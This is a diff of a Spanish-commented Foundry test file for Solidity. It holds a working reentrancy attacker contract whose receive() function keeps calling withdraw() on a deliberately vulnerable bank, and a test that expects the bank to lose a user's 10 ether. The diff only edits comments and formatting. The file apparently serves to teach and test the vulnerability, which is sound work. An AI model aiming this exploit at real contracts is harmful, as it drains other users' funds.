@@ -4,8 +4,8 @@ pragma solidity 0.8.13;
 import "forge-std/Test.sol";
 import "../src/Reentrancy.sol";
 
-// Contrato Atacante Clásico 
-// (Fácil de entender e idéntico filosóficamente al de Medusa)
+// Contrato Atacante Clásico
+//
 contract MaliciousAttacker {
     VulnerableBank public bank;
 
@@ -23,9 +23,8 @@ contract MaliciousAttacker {
         bank.withdraw();
     }
 
-    // LA TRAMPA: Función asíncrona que explota el envío de saldo prematuro del Banco
     receive() external payable {
-        // Mientras al banco le quede dinero (de otros usuarios honestos), seguimos reentrando
+        // Mientras al banco le quede dinero, seguimos reentrando
         if (address(bank).balance >= msg.value) {
             bank.withdraw();
         }
@@ -40,7 +39,7 @@ contract ReentrancyTest is Test {
         bank = new VulnerableBank();
         attacker = new MaliciousAttacker(address(bank));
 
-        // 1. Simular la vida real: Un Usuario Honesto deposita 10 ether en el banco
+        // 1. Simular la vida real: Un Usuario deposita 10 ether en el banco
         vm.deal(address(0x1), 10 ether);
         vm.prank(address(0x1));
         bank.deposit{value: 10 ether}();
@@ -58,6 +57,10 @@ contract ReentrancyTest is Test {
         // 4. PRUEBA DE SEGURIDAD (Se supone que el banco DEBE ser seguro)
         // El banco debería conservar intactos los 10 ether del usuario honesto.
         // Como el atacante lo va a robar todo, esta línea FRACASARÁ, pintando el [FAIL] rojo
-        assertEq(address(bank).balance, 10 ether, "Peligro de Vulnerabilidad: El banco ha perdido el dinero de los usuarios");
+        assertEq(
+            address(bank).balance,
+            10 ether,
+            "Peligro de Vulnerabilidad: El banco ha perdido el dinero de los usuarios"
+        );
     }
 }
